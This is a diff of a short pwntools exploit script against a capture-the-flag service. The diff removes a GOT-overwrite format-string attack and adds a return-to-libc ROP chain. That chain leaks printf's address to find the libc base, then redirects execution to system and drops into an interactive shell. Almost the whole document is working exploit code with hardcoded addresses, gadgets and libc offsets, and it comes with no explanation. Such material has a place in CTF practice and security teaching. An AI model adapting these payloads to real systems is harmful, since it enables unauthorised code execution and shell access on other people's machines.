@@ -2,41 +2,58 @@
 
 from pwn import *
 
-# Start your service by 'ncat -vc ./vul -kl 127.0.0.1 8888'
-# r = remote('127.0.0.1', 8888)
+main = 0x0804851d
+puts_plt = 0x080483c0
+printf_plt = 0x080483b0
+scanf_plt = 0x08048410
+
+puts_got = 0x0804a010
+printf_got = 0x0804a00c
+
+puts_off = 0x65440
+gets_off = 0x64ae0
+system_off = 0x3fc40
+printf_off = 0x4cbb0
+scanf_off = 0x54c40
+
+pop1ret = 0x0804839d
+pop2ret = 0x0804881e
+pop3ret = 0x0804881d
+pop4ret = 0x0804881c
+
+def send(s):
+    print s
+    r.send(s)
+    return r.recvrepeat(0.5)
+
 r = remote('csie.ctf.tw', 10115)
 
-printf_got = 0x804a00c
+mesg = ('-1 -1 ' +
+    '1 '*20 + '0 ' +
+    '2 3 4 5 6 7 8 ' +
+    str(printf_plt) + ' ' + str(main) + ' ' + str(printf_got) + ' ' +
+    '12 0 ')
 
-# Find these offsets by 'readelf -s /lib/i386-linux-gnu/libc.so.6'
-system_off = 0x0003fc40
-printf_off = 0x0004cbb0
-open_off = 0x000d98d0
-read_off = 0x000d9d20
+print mesg
+recv = send(mesg)
+base = u32(recv[-43:-39]) - printf_off
+# base = u32(r.recvline()[:4]) - puts_off
 
-def fmt(s):
-  r.send(s + '\n')
-  return r.recvrepeat(0.1)
+print 'libc base =', hex(base)
 
-# Calculate libc base address by leaking printf@got
-print p32(printf_got) + '%5$s'
-base = u32(fmt(p32(printf_got) + '%5$s')[4:8]) - printf_off
 system = base + system_off
-print 'Libc base:', hex(base)
+gets = base + gets_off
+puts = base + puts_off
+printf = base + printf_off
+scanf = base + scanf_off
 
-# Prepare %hhn format string
-p = ''.join(p32(printf_got+i) for i in range(4))
-printed = 16
-for i in range(4):
-  byte = (system >> (i*8)) & 0xff # value of byte[i]
-  pad = ((byte - printed) % 256 + 256) % 256
-  if pad > 0:
-    p += '%%%dc' % (pad)
-  p += '%%%d$hhn' % (5+i)
-  printed += pad
-print repr(p)
-
-# Overwrite printf() to system()
-fmt(p)
+mesg = ('-1 -1 ' +
+    '1 '*20 + '0 ' +
+    '2 3 4 5 6 ' +
+     str(gets) + ' ' + str(system) + ' ' + str(puts_got) + ' ' + str(puts_got) + ' ' +
+    '11 12 0 ')
+print send(mesg)
 
 r.interactive()
+
+r.close
